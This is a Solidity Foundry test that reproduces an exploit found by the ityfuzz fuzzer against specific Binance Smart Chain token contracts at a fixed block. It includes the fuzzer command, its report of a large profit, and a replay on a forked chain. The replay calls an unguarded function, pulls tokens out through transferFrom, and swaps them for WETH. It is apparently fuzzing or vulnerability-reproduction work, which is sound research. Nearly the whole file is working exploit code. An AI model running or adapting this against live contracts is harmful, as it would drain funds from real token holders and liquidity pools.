// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x5923375f1a732FD919D320800eAeCC25910bEdA3,0x55d398326f99059fF775485246999027B3197955,0x807d99bfF0bad97e839df3529466BFF09c09E706,0x8acb88F90D1f1D67c03379e54d24045D4F6dfDdB,0x435444d086649B846E9C912D21E1Bc651033A623,0x724DbEA8A0ec7070de448ef4AF3b95210BDC8DF6,0xA56622BB16F18AF5B6D6e484a1C716893D0b36DF,0xe8d6502E9601D1a5fAa3855de4a25b5b92690623,0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,0x68531F3d3A20027ed3A428e90Ddf8e32a9F35DC8,0x9117df9aA33B23c0A9C2C913aD0739273c3930b3,0x52AeD741B5007B4fb66860b5B31dD4c542D65785,0xE5cBd18Db5C1930c0A07696eC908f20626a55E3C,0x3B5E381130673F794a5CF67FBbA48688386BEa86,0xC254741776A13f0C3eFF755a740A4B2aAe14a136 -c bsc --onchain-block-number 27264383 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Earned 1771443542461408488000000 more than owed 0, net earned = 1771443542461408488000000wei (1ETH)

================ Trace ================
[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   ├─[1] 0x435444d086649B846E9C912D21E1Bc651033A623.call(0x12424e3f)
   ├─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0x435444d086649B846E9C912D21E1Bc651033A623 → WETH), address(this), block.timestamp);
   ├─[1] 0x3B5E381130673F794a5CF67FBbA48688386BEa86.transferFrom(0x435444d086649B846E9C912D21E1Bc651033A623, 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, 184.4674 Ether)
   └─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0x3B5E381130673F794a5CF67FBbA48688386BEa86 → WETH), address(this), block.timestamp);


 */

contract C5923 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 27264383);
    }

    function test() public {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        
        0x435444d086649B846E9C912D21E1Bc651033A623.call(abi.encodeWithSignature(
            "12424e3f()"
        )); 
        vm.startPrank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        uint256 amount0 = IERC20(0x435444d086649B846E9C912D21E1Bc651033A623).balanceOf(address(this));
        IERC20(0x435444d086649B846E9C912D21E1Bc651033A623).approve(router, amount0);
        address[] memory liq_path0 = new address[](2);
        liq_path0[0] = 0x435444d086649B846E9C912D21E1Bc651033A623;
        liq_path0[1] = address(weth);
        vm.deal(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, amount0);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount0, 0, liq_path0, address(this), block.timestamp
        );
        vm.stopPrank();
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        IERC20(0x3B5E381130673F794a5CF67FBbA48688386BEa86).transferFrom(0x435444d086649B846E9C912D21E1Bc651033A623, 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, 184.4674 Ether);
        
        vm.startPrank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        uint256 amount1 = IERC20(0x3B5E381130673F794a5CF67FBbA48688386BEa86).balanceOf(address(this));
        IERC20(0x3B5E381130673F794a5CF67FBbA48688386BEa86).approve(router, amount1);
        address[] memory liq_path1 = new address[](2);
        liq_path1[0] = 0x3B5E381130673F794a5CF67FBbA48688386BEa86;
        liq_path1[1] = address(weth);
        vm.deal(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, amount1);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount1, 0, liq_path1, address(this), block.timestamp
        );
        vm.stopPrank();
    }

}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
